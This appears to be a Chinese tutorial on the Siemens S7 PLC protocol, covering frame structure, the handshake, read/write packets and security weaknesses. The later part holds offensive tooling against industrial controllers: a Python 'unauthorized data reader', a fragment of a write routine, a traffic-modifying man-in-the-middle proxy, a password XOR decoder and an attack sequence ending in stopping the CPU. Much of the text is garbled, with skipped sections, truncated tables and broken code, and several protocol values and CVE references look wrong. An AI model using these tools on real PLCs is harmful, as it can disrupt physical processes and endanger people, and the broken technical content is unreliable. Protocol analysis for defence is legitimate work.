## 1. S7协议概述

### 1.1 S7协议简介

S7协议是西门子公司开发的专有通信协议，用于SIMATIC S7系列PLC与编程设备、HMI和SCADA系统之间的通信。S7协议运行在ISO-on-TCP（RFC 1006）之上，使用TCP端口102进行通信。

```
S7协议在协议栈中的位置:

┌─────────────────────────────────────────────┐
│              应用层 (S7 Protocol)            │
├─────────────────────────────────────────────┤
│           ISO-on-TCP (RFC 1006)              │
├─────────────────────────────────────────────┤
│              TCP (端口102)                   │
├─────────────────────────────────────────────┤
│                IP                            │
├─────────────────────────────────────────────┤
│          以太网 / 串行 / PROFIBUS            │
└─────────────────────────────────────────────┘
```

### 1.2 S7协议版本

```
S7协议版本发展:

S7Comm (经典S7协议)
├── 用于 S7-200/300/400 系列
├── 无加密
├── 无认证 (可选密码)
├── 明文传输
└── 端口: 102

S7CommPlus (增强S7协议)
├── 用于 S7-1200/1500 系列
├── 加密通信
├── 强认证
├── 完整性校验
├── 防重放保护
└── 端口: 102

S7CommPlus Drake (进一步增强)
├── S7-1500 V2.5+ 固件
├── 更强的加密算法
├── 证书认证
└── 增强的防重放机制
```

### 1.3 支持的设备

| 设备系列 | 支持协议 | 默认端口 | 认证方式 |
|---------|---------|---------|---------|
| S7-200 | S7Comm | 102 | 无/可选密码 |
| S7-300 | S7Comm | 102 | 无/可选密码 |
| S7-400 | S7Comm | 102 | 无/可选密码 |

## 2. S7协议结构详解

### 2.1 完整帧结构

S7协议通信的完整帧结构由多层协议封装：

```
完整S7帧结构:

┌─────────────────────────────────────────────────────────────────┐
│ TPKT层 (4字节)                                                  │
├─────────┬───────┬───────────────────────────────────────────────┤
│ Version │ Reserve│ Length (总长度)                               │
│ (1byte) │ (1byte)│ (2bytes)                                      │
│ =0x03   │ =0x00  │                                               │
├─────────┴───────┴───────────────────────────────────────────────┤
│ COTP层 (变长, 通常3-18字节)                                     │
├─────────────────────────────────────────────────────────────────┤
│ S7协议层 (10字节头 + 变长数据)                                  │
├─────────┬─────────┬─────────┬─────────┬──────────┬──────────────┤
│ ProtID  │ ROSCTR  │ Reserve │ PDU Ref │ ParamLen │ DataLen      │
│ (1byte) │ (1byte) │ (2bytes)│ (2bytes)│ (2bytes) │ (2bytes)     │
│ =0x32   │         │         │         │          │              │
├─────────┴─────────┴─────────┴─────────┴──────────┴──────────────┤
│ 参数区 (变长)                                                   │
├─────────────────────────────────────────────────────────────────┤
│ 数据区 (变长)                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 TPKT层

TPKT (Transport Service on top of the TCP) 用于在TCP上封装OSI传输协议：

```
TPKT帧格式:
┌──────────┬──────────┬────────────────────────────┐
│ Version  │ Reserved │ Length                      │
│ (1 byte) │ (1 byte) │ (2 bytes, Big Endian)       │
└──────────┴──────────┴────────────────────────────┘

字段说明:
- Version: 固定为 0x03
- Reserved: 固定为 0x00
- Length: 整个TPKT帧的长度 (包括TPKT头自身)
  最小值: 7 (TPKT=4 + COTP最小=3)
  最大值: 65535

示例: 0x03 0x00 0x00 0x1F -> 长度=31字节
```

### 2.3 COTP层

COTP (ISO 8073) 提供传输层服务，分为多种PDU类型：

```
COTP PDU类型:

1. 连接请求 (Connect Request, CR):
   ┌──────────┬──────────┬───────────┬───────────┬────────┐
   │ Length   │ PDU Type │ Dest Ref  │ Src Ref   │ Class  │
   │ (1byte)  │ (1byte)  │ (2bytes)  │ (2bytes)  │ (1byte)│
   │          │ =0xE0    │           │           │ =0x00  │
   └──────────┴──────────┴───────────┴───────────┴────────┘
   ┌──────────────────────────────────────────────────────────┐
   │ 可变参数区                                                │
   ├────────┬────────┬─────────────────────────────────────────┤
   │ TPDU   │ Param  │ 参数值                                  │
   │ Size   │ Code   │                                          │
   ├────────┼────────┼─────────────────────────────────────────┤
   │ 0xC0   │ 0x02   │ Called TSAP (2bytes)                    │
   ├────────┼────────┼─────────────────────────────────────────┤
   │ 0xC1   │ 0x02   │ Calling TSAP (2bytes)                   │
   ├────────┼────────┼─────────────────────────────────────────┤
   │ 0xC2   │ 0x01   │ TPDU Size (1byte)                       │
   └────────┴────────┴─────────────────────────────────────────┘

   TSAP格式: 0x01 0x00 -> 设备类型/机架/槽号
   TPDU Size: 0x0A=1024, 0x0B=2048, 0x0C=4096, 0x0D=8192

2. 连接确认 (Connect Confirm, CC):
   PDU Type = 0xD0
   格式与CR相同，Dest/Src引用互换

3. 数据传输 (Data Transfer, DT):
   ┌──────────┬──────────┐
   │ Length   │ PDU Type │
   │ =0x02    │ =0xF0    │
   └──────────┴──────────┘
   后接S7协议数据

4. 断开请求 (Disconnect Request, DR):
   PDU Type = 0x80

5. 拒绝 (Reject):
   PDU Type = 0x50
```

### 2.4 S7协议层

```
S7协议头格式 (10字节):

┌──────────┬──────────┬──────────┬──────────┬──────────┬──────────┐
│ Protocol │ PDU Type │ Reserved │ PDU Ref  │ Param    │ Data     │
│ ID       │ (ROSCTR) │          │          │ Length   │ Length   │
│ (1byte)  │ (1byte)  │ (2bytes) │ (2bytes) │ (2bytes) │ (2bytes) │
│ =0x32    │          │          │          │          │          │
└──────────┴──────────┴──────────┴──────────┴──────────┴──────────┘

PDU Type (ROSCTR) 取值:
  0x01 - 请求 (Request)
  0x02 - 确认 (Ack)
  0x03 - 响应数据 (Ack-Data)
  0x04 - 用户数据 (User Data)
  0x05 - 丢弃 (Discard)
  0x06 - 未定义
  0x07 - 未定义
  0x08 - 保留
  0x09 - 保留
  0x0A - 保留
  0x0B - 保留
  0x0C - 保留
  0x0D - 保留
  0x0E - 保留
  0x0F - 保留
  0x10 - 保留
  0x28 - 密码验证 (Password Check)
  0x29 - 密码验证确认

Reserved: 固定为 0x0000

PDU Reference: 递增的序号，用于请求-响应匹配
  范围: 0x0000 - 0xFFFF

Param Length: 参数区长度
Data Length: 数据区长度
```

### 2.5 参数区详解

参数区定义了S7协议的操作类型和参数：

```
参数区结构:

┌──────────┬──────────┬──────────────────────────────────────────┐
│ Func     │ SubFunc/ │ 参数数据                                 │
│ Group    │ ItemSpec │                                          │
│ (1byte)  │ (1byte)  │ (变长)                                   │
└──────────┴──────────┴──────────────────────────────────────────┘

功能组 (Func Group):
  0x00 - 取消
  0x01 - CPU服务
  0x02 - 模块信息
  0x03 - 诊断
  0x04 - 读/写变量
  0x05 - 控制CPU (启停等)
  0x06 - 程序处理
  0x07 - 安全功能
  0x08 - 安全参数设置
  0x09 - 组态/编程
  0x0A - 循环读
  0x0B - 安全通信设置
  0x0C - 接口/模块信息
  0x0D - 文件传输
  0x0E - 组态上传
  0x0F - 安全文件传输
  0x10 - 时间设置
  0x11 - 安全功能

子功能码 (常见):
  读变量: 0x04, 0x01 -> 子功能=0x12 (变量规格)
  写变量: 0x05, 0x01 -> 子功能=0x12 (变量规格)
  CPU启停: 0x28, 0x00 -> 启动 / 0x28, 0x01 -> 停止
  密码验证: 0x28, 0x02 -> 子功能=0x26
```

### 2.6 变量规格 (Variable Specification)

S7协议使用变量规格来寻址PLC内存区域：

```
变量规格格式 (Item结构):

┌──────────┬──────────┬──────────┬──────────┬──────────┬──────────┐
│ Item     │ Length   │ Syntax   │ Area     │ DB Number│ Address  │
│ Type     │ of Read  │ ID       │ Type     │          │          │
│ (1byte)  │ (1byte)  │ (1byte)  │ (1byte)  │ (2bytes) │ (3bytes) │
│ =0x12    │ =0x0A    │ =0x10    │          │          │          │
└──────────┴──────────┴──────────┴──────────┴──────────┴──────────┘

Item Type: 0x12 = 变量
Length of Read: 0x0A = 10字节
Syntax ID: 0x10 = 地址/类型语法

区域类型 (Area Type):
  0x81 - I (过程映像输入区)
  0x82 - Q (过程映像输出区)
  0x83 - M (标志位区)
  0x84 - DB (数据块)
  0x85 - DI (背景数据块)
  0x86 - C (计数器)
  0x87 - T (定时器)
  0x88 - P (外设输入)
  0x89 - P (外设输出)
  0x8A - V (变量存储器, S7-200)

DB Number:
  对于DB/DI区域: 数据块编号 (1-65535)
  对于其他区域: 0

Address:
  字节地址编码为3字节, 实际为字地址*8+位地址
  例如: M10.2 -> 地址 = 10*8 + 2 = 82 -> 0x000052
  例如: DB1.DBW10 -> 地址 = 10*8 = 80 -> 0x000050
```

### 3.2 COTP连接建立

COTP连接建立阶段协商TSAP参数：

```
COTP连接请求:

参数: Called TSAP (目标TSAP)
  格式: 0x01 0xTT
  TT编码:
    bits 7-5: 连接类型 (000=随机, 001=固定)
    bits 4-3: 机架号 (00=机架0)
    bits 2-0: 槽号 (001=槽1, CPU通常在槽1)

  例如: 0x01 0x00 -> 机架0, 槽1 (S7-300 CPU默认)
       0x01 0x03 -> 机架0, 槽3 (S7-400 CPU默认)

参数: Calling TSAP (源TSAP)
  格式与Called TSAP相同

参数: TPDU Size
  0x0A = 1024字节
  0x0B = 2048字节
  0x0C = 4096字节
  0x0D = 8192字节

连接请求示例:
03 00 00 16           TPKT (长度=22)
11 E0 00 01 00 01 00  COTP连接请求
C0 02 01 00           Called TSAP=0x0100
C1 02 01 02           Calling TSAP=0x0102
C2 01 0A              TPDU Size=1024

连接确认示例:
03 00 00 16           TPKT (长度=22)
11 D0 00 01 00 01 00  COTP连接确认
C0 02 01 00           Called TSAP
C1 02 01 02           Calling TSAP
C2 01 0A              TPDU Size=1024
```

### 3.4 密码验证流程

S7-300/400支持可选的密码保护：

```
密码验证流程:

1. 客户端发送密码验证请求
   功能组: 0x28
   子功能: 0x02 (验证)
   数据: 加密的8字节密码

2. 密码加密算法:
   - 8字节密码
   - 与固定密钥进行XOR运算
   - 固定密钥: 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55
   - 结果: XOR后的8字节

3. 验证结果:
   成功: PLC返回正常确认
   失败: PLC返回异常码

注意:
- 这种"加密"极弱，等同于明文传输
- 可以通过抓包直接获取密码
- S7-1500使用更强的认证机制
```

```python
# S7密码加解密示例
def s7_encrypt_password(password):
    """S7密码加密 (XOR)"""
    key = bytes([0x55] * 8)
    pwd_bytes = password.encode('ascii').ljust(8, b'\x00')[:8]
    encrypted = bytes([p ^ k for p, k in zip(pwd_bytes, key)])
    return encrypted

def s7_decrypt_password(encrypted_bytes):
    """S7密码解密 (XOR)"""
    key = bytes([0x55] * 8)
    decrypted = bytes([e ^ k for e, k in zip(encrypted_bytes, key)])
    return decrypted.decode('ascii').rstrip('\x00')

# 示例
password = "secret"
encrypted = s7_encrypt_password(password)
print(f"密码: {password}")
print(f"加密后: {encrypted.hex()}")
print(f"解密后: {s7_decrypt_password(encrypted)}")
```

### 3.5 读变量流程

```
读变量完整流程:

1. 构建读请求:
   功能组: 0x04 (读变量)
   子功能: 0x01 (1个Item)
   Item: 变量规格

2. 请求示例 (读MW10):
   32 01 00 00 00 01 00 0E 00 00
   04 01 12 0A 10 02 00 00 83 00 0A 00 00 01

   解析:
   32      = S7协议ID
   01      = 请求
   00 00   = 保留
   00 01   = PDU引用=1
   00 0E   = 参数长度=14
   00 00   = 数据长度=0
   04      = 读变量
   01      = 1个Item
   12      = Item类型=变量
   0A      = Item长度=10
   10      = 语法ID=地址/类型
   02      = 传输大小=WORD (2字节)
   00 00   = DB号=0 (M区)
   83      = 区域=M
   00 0A 00 = 地址=MW10
   00 01   = 读取个数=1

3. 响应示例:
   32 03 00 00 00 01 00 02 00 04
   04 01 FF 04 00 08

   解析:
   32      = S7协议ID
   03      = 响应数据
   00 00   = 保留
   00 01   = PDU引用=1 (匹配请求)
   00 02   = 参数长度=2
   00 04   = 数据长度=4
   04      = 读变量
   01      = 1个Item
   FF      = 无异常
   04      = 数据长度=4 (实际可能为2, 依据传输大小)
   00 08   = 数据值=8
```

### 3.6 写变量流程

```
写变量流程:

1. 构建写请求:
   功能组: 0x05 (写变量)
   子功能: 0x01 (1个Item)

2. 请求示例 (写MW10 = 0x1234):
   32 01 00 00 00 01 00 0E 00 04
   05 01 12 0A 10 02 00 00 83 00 0A 00 00 01
   00 04 00 08 12 34

   参数区:
   05 01 12 0A 10 02 00 00 83 00 0A 00 00 01
   05      = 写变量
   01      = 1个Item
   12 0A 10 02 00 00 83 00 0A 00 00 01 = 变量规格(同读)

   数据区:
   00 04 00 08 12 34
   00      = 返回码占位
   04      = 数据传输大小
   00 08   = 数据长度
   12 34   = 实际数据

3. 响应:
   32 03 00 00 00 01 00 02 00 01
   05 01 FF

   05 01 FF = 写变量, 1个Item, 返回码FF(成功)
```

```
CPU启停控制:

1. 启动CPU:
   功能组: 0x28

   功能组: 0x28

   32 03 00 00 00 01 00 00 00 00
```

## 4. S7协议安全风险

### 4.1 安全风险总览

```
S7协议安全风险矩阵:

┌────────────────────┬──────────┬──────────┬──────────┐
```

### 4.2 无认证/弱认证风险

```
认证机制分析:

S7Comm (经典协议):
- 默认无认证
- 可选密码保护 (但加密极弱)
- 密码通过XOR 0x55 "加密"
- 无证书认证
- 无会话绑定

风险:
1. 未授权读取PLC程序和数据
   - 攻击者可直接连接PLC读取数据块、标志位
   - 获取工艺参数和配方数据
   - 了解生产流程和控制系统逻辑

2. 未授权修改PLC程序
   - 直接写入恶意逻辑
   - 修改控制参数
   - 改变报警阈值

3. CPU控制
   - 停止PLC运行
   - 导致生产中断
   - 可能引发安全事故

示例攻击序列:
   连接 -> 读MW100 -> 写MW200 -> 停止CPU
   整个过程无需任何认证
```

### 4.3 明文传输风险

```
   - ARP欺骗重定向流量
```

### 4.4 缓冲区溢出风险

```
S7协议实现中的缓冲区溢出:

已知漏洞类型:
1. TSAP处理溢出
   - 过长的TSAP字段
   - 导致COTP层缓冲区溢出

2. 变量规格溢出
   - 超长Item数据
   - 超大读取长度字段
   - 导致S7协议层缓冲区溢出

   - Length字段与实际数据不匹配
   - 整数溢出导致缓冲区过小

   - 超长密码字段
   - 导致密码验证函数溢出

- CVE-2019-13926: S7-300/400 PLC认证绕过
- CVE-2020-6905: S7-1500缓冲区溢出
- CVE-2021-3564: S7-1200/1500权限提升
```

### 4.5 重放攻击风险

```
S7Comm重放攻击:

攻击原理:
1. 录制合法的S7通信会话
2. 提取关键操作 (如写操作)
3. 在之后重放该操作

- S7Comm无防重放机制
- S7CommPlus有序列号和时间戳保护
```

```python
#!/usr/bin/env python3
"""S7协议未授权数据读取工具"""
import socket
import struct

class S7DataReader:
    """S7协议数据读取器"""
    
    def __init__(self, target_ip, port=102):
        self.target_ip = target_ip
        self.port = port
        self.sock = None
        self.pdu_ref = 0
    
    def connect(self, rack=0, slot=1):
        """建立S7连接"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.target_ip, self.port))
        
        # COTP连接请求
        called_tsap = (rack << 4) | slot
        cotp_cr = self._build_cotp_cr(called_tsap, called_tsap + 2)
        self.sock.send(cotp_cr)
        response = self.sock.recv(1024)
        
        if len(response) < 7 or response[5] != 0xD0:
            raise Exception("COTP连接失败")
        
        # S7通信设置
        setup = self._build_s7_setup()
        self.sock.send(setup)
        response = self.sock.recv(1024)
        
        if len(response) < 12:
            raise Exception("S7通信设置失败")
        
        return True
    
    def _build_cotp_cr(self, called_tsap, calling_tsap):
        """构建COTP连接请求"""
        tpkt = struct.pack('>BBH', 3, 0, 22)
        cotp = bytes([
            0x11, 0xE0,  # Length=17, PDU=Connect Request
            0x00, 0x01,  # Dest Ref
            0x00, 0x01,  # Src Ref
            0x00,        # Class
            0xC0, 0x02,  # Called TSAP
            0x01, called_tsap,
            0xC1, 0x02,  # Calling TSAP
            0x01, calling_tsap,
            0xC2, 0x01, 0x0A  # TPDU Size = 1024
        ])
        return tpkt + cotp
    
    def _build_s7_setup(self):
        """构建S7通信设置请求"""
        tpkt = struct.pack('>BBH', 3, 0, 27)
        cotp = bytes([0x02, 0xF0, 0x80])  # Data Transfer
        s7 = struct.pack('>BBHHHH',
            0x32, 0x01, 0x0000, self._next_ref(),
            0x0008, 0x0000
        )
        param = struct.pack('>BBHBBH',
            0xF0, 0x00, 0x0001,
            0x00, 0x01, 0x04E2
        )
        return tpkt + cotp + s7 + param
    
    def _next_ref(self):
        self.pdu_ref = (self.pdu_ref + 1) & 0xFFFF
        return self.pdu_ref
    
    def read_area(self, area, db_num, start, size, data_type='BYTE'):
        """读取PLC内存区域
        
        参数:
            area: 区域类型 ('I','Q','M','DB','C','T')
            db_num: DB号 (非DB区域为0)
            start: 起始地址
            size: 读取数量
            data_type: 数据类型 ('BIT'=1,'BYTE'=2,'WORD'=4,'DWORD'=6)
        """
        area_codes = {'I':0x82, 'Q':0x82, 'M':0x83, 'DB':0x84,
                      'DI':0x85, 'C':0x86, 'T':0x87, 'V':0x88}
        type_codes = {'BIT':0x01, 'BYTE':0x02, 'WORD':0x04,
                      'DWORD':0x06, 'BYTE_STR':0xFF}
        
        area_code = area_codes.get(area, 0x83)
        type_code = type_codes.get(data_type, 0x02)
        
        # 计算地址偏移
        byte_offset = start * 8 if data_type == 'BIT' else start
        
        # 构建Item
        item = struct.pack('>BBBB',
            0x12,  # Item类型=变量
            0x0A,  # Item长度=10
            0x10,  # 语法ID
            type_code  # 传输大小
        )
        item += struct.pack('>H', db_num)  # DB号
        item += struct.pack('>B', area_code)  # 区域类型
        item += struct.pack('>I', byte_offset)[1:]  # 地址 (3字节)
        item += struct.pack('>H', size)  # 读取数量
        
        # 构建S7请求
        tpkt = struct.pack('>BBH', 3, 0, 17 + len(item))
        cotp = bytes([0x02, 0xF0, 0x80])
        s7 = struct.pack('>BBHHHH',
            0x32, 0x01, 0x0000,
            self._next_ref(),
            len(item), 0
        )
        
        param = struct.pack('>BB', 0x04, 0x01)  # 读变量, 1个Item
        
        packet = tpkt + cotp + s7 + param + item[2:]
        
        self.sock.send(packet)
        response = self.sock.recv(4096)
        
        return self._parse_read_response(response, size, data_type)
    
    def _parse_read_response(self, response, expected_size, data_type):
        """解析读响应"""
        if len(response) < 14:
            return None
        
        # 跳过TPKT(4) + COTP(3) + S7头(10)
        offset = 17
        
        # 参数区
        param_len = struct.unpack('>H', response[8:10])[0]
        
        # 数据区
        data_offset = 17 + param_len
        
        if data_offset + 1 < len(response):
            return_code = response[data_offset]
            if return_code != 0xFF:
                print(f"读取错误, 返回码: 0x{return_code:02X}")
                return None
            
            data_size = response[data_offset + 1]
            actual_data = response[data_offset + 2:data_offset + 2 + data_size]
            
            return actual_data
        
        return None
    
    def read_plc_info(self):
        """读取PLC设备信息"""
        # 读取模块信息
        info = {}
        
        # 读标志位区MW0 (通常包含版本信息)
        data = self.read_area('M', 0, 0, 4, 'WORD')
        if data:
            info['MW0'] = struct.unpack('>H', data[:2])[0]
        
        # 读取诊断缓冲区 (SZL)
        info.update(self._read_szl())
        
        return info
    
    def _read_szl(self):
        """读取系统状态列表 (SZL)"""
        self.pdu_ref += 1
        
        # SZL请求: 读取模块标识
        tpkt = struct.pack('>BBH', 3, 0, 33)
        cotp = bytes([0x02, 0xF0, 0x80])
        s7 = struct.pack('>BBHHHH',
            0x32, 0x07, 0x0000,
            self.pdu_ref, 0x000C, 0x000C
        )
        
        # 参数: 用户数据, 读SZL
        param = struct.pack('>BB',
            0x04,  # 功能组: 用户数据
            0x01   # 子功能: 读
        )
        
        # SZL请求头
        szl_header = struct.pack('>BBH',
            0x12, 0x04, 0x0111  # SZL ID = 0x0111 (模块标识)
        )
        szl_header += struct.pack('>HH', 0x0001, 0x0000)  # 索引
        
        # 数据头
        data_header = struct.pack('>BBH', 0x0A, 0x00, 0x0001)
        
        packet = tpkt + cotp + s7 + param + szl_header + data_header
        
        self.sock.send(packet)
        response = self.sock.recv(4096)
        
        return {'szl_response_length': len(response)}
    
    def close(self):
        if self.sock:
            self.sock.close()

# 使用示例
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("用法: python3 s7_reader.py <目标IP>")
        sys.exit(1)

            if data:
                print(f"  M{addr} = 0x{data[0]:02X}")
        
        # 读取数据块
        print("\n  读取DB1数据:")
        data = reader.read_area('DB', 1, 0, 10, 'BYTE')
        if data:
            print(f"  DB1.DB0-9 = {data.hex()}")
    
    except Exception as e:
        print(f"[-] 错误: {e}")
    finally:
        reader.close()
```

```python
        type_sizes = {'BIT':1, 'BYTE':1, 'WORD':2, 'DWORD':4}
        
        area_code = area_codes.get(area, 0x83)
        type_code = type_sizes.get(data_type, 1)

        item = struct.pack('>BBBB', 0x12, 0x0A, 0x10, type_code * 2)

        item += struct.pack('>H', len(data))

        packet = struct.pack('>BBH', 3, 0, total_len)

        packet += struct.pack('>BBHHHH',
            0x32, 0x01, 0, self._next_ref(),
            len(item), len(data_item)
        )
        packet += struct.pack('>BB', 0x05, 0x01)  # 写变量
        packet += item[2:]
        packet += data_item
        
        self.sock.send(packet)
        response = self.sock.recv(1024)

            return return_code == 0xFF
```

### 5.3 中间人攻击

```python
#!/usr/bin/env python3
"""S7协议中间人攻击框架"""
import socket
import struct
import threading
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

class S7MITMProxy:
    """S7协议中间人代理"""
    
    def __init__(self, plc_ip, plc_port=102, listen_port=10202):
        self.plc_ip = plc_ip
        self.plc_port = plc_port
        self.listen_port = listen_port
        self.running = False
        self.modification_rules = []
    
    def add_modification_rule(self, rule_type, pattern, replacement):
        """添加修改规则
        
        参数:
            rule_type: 'read' 或 'write'
            pattern: 要匹配的模式 (bytes)
            replacement: 替换内容 (bytes)
        """
        self.modification_rules.append({
            'type': rule_type,
            'pattern': pattern,
            'replacement': replacement
        })
    
    def start(self):
        """启动代理"""
        self.running = True
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.listen_port))
        server.listen(5)
        
        logger.info(f"MITM代理监听端口: {self.listen_port}")
        logger.info(f"转发目标: {self.plc_ip}:{self.plc_port}")
        
        while self.running:
            try:
                client_sock, client_addr = server.accept()
                logger.info(f"客户端连接: {client_addr}")
                
                # 连接真实PLC
                plc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                plc_sock.connect((self.plc_ip, self.plc_port))
                
                # 启动双向转发
                t1 = threading.Thread(
                    target=self._forward,
                    args=(client_sock, plc_sock, 'client->plc')
                )
                t2 = threading.Thread(
                    target=self._forward,
                    args=(plc_sock, client_sock, 'plc->client')
                )
                t1.daemon = True
                t2.daemon = True
                t1.start()
                t2.start()
                
            except Exception as e:
                if self.running:
                    logger.error(f"接受连接失败: {e}")
    
    def _forward(self, src_sock, dst_sock, direction):
        """转发数据"""
        try:
            while self.running:
                data = src_sock.recv(4096)
                if not data:
                    break
                
                # 记录原始数据
                logger.info(f"[{direction}] 原始数据 ({len(data)} bytes):")
                self._log_s7_packet(data, direction)
                
                # 应用修改规则
                modified_data = self._apply_modifications(data, direction)
                
                if modified_data != data:
                    logger.warning(f"[{direction}] 数据已被修改!")
                    logger.info(f"  原始: {data.hex()}")
                    logger.info(f"  修改: {modified_data.hex()}")
                
                dst_sock.send(modified_data)
                
        except Exception as e:
            logger.error(f"转发错误 [{direction}]: {e}")
        finally:
            src_sock.close()
            dst_sock.close()
    
    def _apply_modifications(self, data, direction):
        """应用修改规则"""
        modified = data
        
        rule_type = 'write' if direction == 'client->plc' else 'read'
        
        for rule in self.modification_rules:
            if rule['type'] == rule_type:
                modified = modified.replace(
                    rule['pattern'],
                    rule['replacement']
                )
        
        return modified
    
    def _log_s7_packet(self, data, direction):
        """记录S7数据包详情"""
        if len(data) < 12:
            return
        
        # 解析TPKT
        if data[0] != 0x03:
            return
        
        tpkt_len = struct.unpack('>H', data[2:4])[0]
        
        # 解析COTP
        cotp_len = data[4]
        cotp_type = data[5]
        
        if cotp_type == 0xF0:
            # 数据传输
            if len(data) > 7:
                # S7协议头
                s7_id = data[7]
                if s7_id == 0x32 and len(data) > 12:
                    pdu_type = data[8]
                    pdu_ref = struct.unpack('>H', data[10:12])[0]
                    param_len = struct.unpack('>H', data[12:14])[0]
                    data_len = struct.unpack('>H', data[14:16])[0]
                    
                    # 解析功能组
                    if param_len > 0 and len(data) > 16:
                        func_group = data[16]
                        func_names = {
                            0x04: '读变量',
                            0x05: '写变量',
                            0x28: 'CPU控制',
                            0x29: '密码验证',
                            0xF0: '通信设置',
                        }
                        func_name = func_names.get(func_group, f'未知(0x{func_group:02X})')
                        
                        logger.info(f"  S7 PDU: 类型=0x{pdu_type:02X}, "
                                    f"引用={pdu_ref}, 功能={func_name}")
                        
                        # 如果是写操作, 显示写入的数据
                        if func_group == 0x05 and data_len > 0:
                            write_offset = 17 + param_len
                            if write_offset < len(data):
                                write_data = data[write_offset:]
                                logger.info(f"  写入数据: {write_data.hex()}")
                        
                        # 如果是CPU控制
                        if func_group == 0x28:
                            if len(data) > 17:
                                sub_func = data[17]
                                if sub_func == 0x00:
                                    logger.warning("  [!] CPU启动命令!")
                                elif sub_func == 0x01:
                                    logger.warning("  [!] CPU停止命令!")
        
        elif cotp_type == 0xE0:
            logger.info("  COTP连接请求")
        elif cotp_type == 0xD0:
            logger.info("  COTP连接确认")
```

## 7. S7CommPlus协议分析

### 7.1 S7CommPlus概述

S7CommPlus是西门子为S7-1200/1500 PLC设计的新一代通信协议，解决了S7Comm的安全缺陷。

```

├────────────────────┼──────────────┼────────────────┤

│ 加密               │ 无           │ AES-128/256    │
│ 完整性             │ 无           │ HMAC-SHA256   │
│ 防重放             │ 无           │ 序列号+时间戳  │
│ 密钥协商           │ 无           │ ECDH           │
│ 会话绑定           │ 无           │ 会话ID         │
│ 支持设备           │ S7-300/400   │ S7-1200/1500   │
│ 端口               │ 102          │ 102            │
└────────────────────┴──────────────┴────────────────┘
```

### 7.4 S7CommPlus TLV编码

```python
#!/usr/bin/env python3
"""S7CommPlus TLV编码/解码工具"""

class TLV:
    """S7CommPlus TLV (Type-Length-Value) 编码"""
    
    # 类型定义
    TYPE_NULL = 0x00
    TYPE_BOOL = 0x01
    TYPE_UINT8 = 0x02
    TYPE_UINT16 = 0x03
    TYPE_UINT32 = 0x04
    TYPE_UINT64 = 0x05
    TYPE_INT8 = 0x06
    TYPE_INT16 = 0x07
    TYPE_INT32 = 0x08
    TYPE_INT64 = 0x09
    TYPE_FLOAT32 = 0x0A
    TYPE_FLOAT64 = 0x0B
    TYPE_STRING = 0x0C
    TYPE_BYTES = 0x0D
    TYPE_ARRAY = 0x0E
    TYPE_STRUCT = 0x0F
    
    @staticmethod
    def encode_length(length):
        """编码长度字段"""
        if length < 0x80:
            return bytes([length])
        elif length < 0x4000:
            return bytes([(length >> 8) | 0x80, length & 0xFF])
        elif length < 0x200000:
            return bytes([
                (length >> 16) | 0xC0,
                (length >> 8) & 0xFF,
                length & 0xFF
            ])
        else:
            return bytes([
                (length >> 24) | 0xE0,
                (length >> 16) & 0xFF,
                (length >> 8) & 0xFF,
                length & 0xFF
            ])
    
    @staticmethod
    def decode_length(data, offset=0):
        """解码长度字段"""
        if offset >= len(data):
            return 0, 0
        
        first_byte = data[offset]
        
        if first_byte < 0x80:
            return first_byte, 1
        elif first_byte < 0xC0:
            length = ((first_byte & 0x3F) << 8) | data[offset + 1]
            return length, 2
        elif first_byte < 0xE0:
            length = ((first_byte & 0x1F) << 16) | \
                     (data[offset + 1] << 8) | data[offset + 2]
            return length, 3
        else:
            length = ((first_byte & 0x0F) << 24) | \
                     (data[offset + 1] << 16) | \
                     (data[offset + 2] << 8) | data[offset + 3]
            return length, 4
    
    @staticmethod
    def encode(type_id, value):
        """编码TLV"""
        if type_id == TLV.TYPE_UINT8:
            data = bytes([value & 0xFF])
        elif type_id == TLV.TYPE_UINT16:
            import struct
            data = struct.pack('>H', value)
        elif type_id == TLV.TYPE_UINT32:
            import struct
            data = struct.pack('>I', value)
        elif type_id == TLV.TYPE_STRING:
            data = value.encode('utf-8')
        elif type_id == TLV.TYPE_BYTES:
            data = value
        else:
            data = value
        
        encoded = bytes([type_id])
        encoded += TLV.encode_length(len(data))
        encoded += data
        
        return encoded
    
    @staticmethod
    def decode(data, offset=0):
        """解码TLV"""
        if offset >= len(data):
            return None, 0, 0
        
        type_id = data[offset]
        length, len_size = TLV.decode_length(data, offset + 1)
        value_offset = offset + 1 + len_size
        value = data[value_offset:value_offset + length]
        
        return type_id, value, 1 + len_size + length

# 使用示例
if __name__ == '__main__':
    # 编码示例
    encoded = TLV.encode(TLV.TYPE_UINT16, 0x1234)
    print(f"编码 uint16(0x1234): {encoded.hex()}")
    
    encoded = TLV.encode(TLV.TYPE_STRING, "Hello S7CommPlus")
    print(f"编码 string: {encoded.hex()}")
    
    # 解码示例
    data = bytes.fromhex('031234' + '0C0F48656C6C6F205337436F6D6D506C7573')
    offset = 0
    while offset < len(data):
        type_id, value, consumed = TLV.decode(data, offset)
        if type_id is None:
            break
        print(f"类型: 0x{type_id:02X}, 值: {value.hex() if isinstance(value, bytes) else value}")
        offset += consumed
```
